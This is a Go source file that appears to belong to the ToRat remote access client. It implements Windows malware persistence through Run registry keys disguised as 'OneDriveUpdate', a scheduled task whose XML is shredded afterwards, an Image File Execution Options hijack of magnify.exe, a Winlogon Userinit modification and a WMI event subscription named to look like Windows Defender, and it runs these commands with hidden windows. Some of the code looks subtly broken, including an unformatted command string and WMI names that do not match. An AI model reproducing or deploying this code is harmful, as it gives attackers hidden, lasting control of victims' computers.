package client

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"github.com/lu4p/ToRat_client/shred"
	"golang.org/x/sys/windows/registry"
)

// TODO: Persit on different locations on disk
// TODO: Add Fileless persistence as shown by
// https://github.com/ewhitehats/InvisiblePersistence

func Persist(path string) {
	elevated := CheckElevate()
	if elevated {
		persistAdmin(path)
	} else {
		persistUser(path)
	}
}

func persistAdmin(path string) {
	go schtasks(path)
	go ifeo(path)
	go userinit(path)
	go wmic(path)
	go hklm(path)
}

func persistUser(path string) {
	version, err := GetVer()
	if err != nil {
		return
	}
	if version == 10 {
		err = cortana(path)
		if err == nil {
			return
		}
	}
	hkcu(path)

}

func cortana(path string) error {
	//noadmin works on win 10
	key, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("cortana success")
	return nil

}

func hkcu(path string) error {
	//noadmin should just work
	key, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hkcu success")
	return nil
}

func hklm(path string) error {
	//admin
	keypath := `Software\Microsoft\Windows\CurrentVersion\Run`
	if runtime.GOARCH == "386" {
		keypath = `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`

	}
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, keypath,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hklm success")
	return nil
}

func schtasks(path string) error {
	//admin
	var xmlTemplate = schtask
	var tempxml = filepath.Join(Path, "temp.xml")
	err := ioutil.WriteFile(tempxml, []byte(xmlTemplate), 0666)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd", "/C", "schtasks /create /xml %s /tn OneDriveUpdate", filepath.Join(Path, "temp.xml"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)
	shred.File(tempxml, true)
	log.Println("schtask success")
	return nil
}

func ifeo(path string) error {
	//admin
	access, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer access.Close()
	keypath := `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	if runtime.GOARCH == "386" {
		keypath = `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	}
	magnify, _, err := registry.CreateKey(
		registry.CURRENT_USER, keypath,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer magnify.Close()
	if err := magnify.SetStringValue("Configuration", "magnifierpane"); err != nil {
		return err
	}

	if err := access.SetStringValue("Debugger", path); err != nil {
		return err
	}
	log.Println("ifeo success")
	return nil
}

func userinit(path string) error {
	//admin
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), path))
	if err != nil {
		return err
	}
	log.Println("userinit success")
	return nil
}

func wmic(path string) error {
	//admin
	cmd := exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WindowsDefender', ExecutablePath='%s',CommandLineTemplate='%s'",
			path,
			path,
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C", "wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer''")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	log.Println("wmci success")
	return nil
}
